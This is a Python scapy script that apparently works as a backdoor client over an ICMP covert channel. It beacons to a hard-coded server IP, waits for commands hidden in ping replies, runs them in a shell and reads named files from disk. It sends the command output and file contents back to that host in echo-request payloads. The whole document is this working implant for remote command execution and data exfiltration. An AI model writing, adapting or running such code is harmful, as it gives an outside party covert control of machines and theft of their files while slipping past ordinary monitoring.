import sys
import signal
import time
from subprocess import PIPE, Popen
from scapy.all import *

SERVER_IP = "16.16.91.30"
INTERFACE = "enx000acd431b81"
ECHO_REQUEST = "echo-request"
UTF_8 = "utf-8"
ICMP_REPLY = "icmp[0]=0"

def signal_handler(sig, frame):
    sys.exit(0)


def send_hello():
    message = "hey server, i'm available"
    send(IP(dst=SERVER_IP)/ICMP(type=ECHO_REQUEST, id=0x001)/message)


def send_packet(payload, pkt):
    send(IP(dst=SERVER_IP)/ICMP(type=ECHO_REQUEST, id=pkt[ICMP].id)/payload)


def fragment_packet(payload, prefix, pkt):
    for chunk in range(0, len(payload), 1000):
        curr = chunk
        send_packet(prefix + payload[curr:curr+1000], pkt)


def send_file(file_name, pkt):
    with open(file_name, "rb") as current_file:
        content = current_file.read()
        fragment_packet(content, file_name.encode(), pkt)
    send_packet("file sending completed", pkt)
        

def run_command(payload, pkt):
    process = Popen(payload[4:], shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return_code = process.returncode
    reply = "stdout: {}\nstderr: {}return code: {}".format(stdout.decode(UTF_8), stderr.decode(UTF_8), return_code)
    if len(reply) > 1000:
        fragment_packet(reply, "", pkt)
    else:
        send_packet(reply, pkt)


def main(): 
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        send_hello()
       
        while True:
            pkt = sniff(iface=INTERFACE, filter=ICMP_REPLY, count=1, store='0')[0]	# store parameter makes sniff() not store anything and thus run forever
            payload = pkt[0][Raw].load.decode(UTF_8) # strip down packet to payload itself
            if payload == "hey server, i'm available":
                continue
            else:
                break
        
        command_array = payload.split(" ")
        result = ""
        if command_array[0] == "send":
            send_file(command_array[1], pkt)
        elif command_array[0] == "run":
            run_command(payload, pkt) 
        else:
            raise Exception("invalid command: %s" % (payload))
        
        time.sleep(5) #???

if __name__ == "__main__":
    main()
        

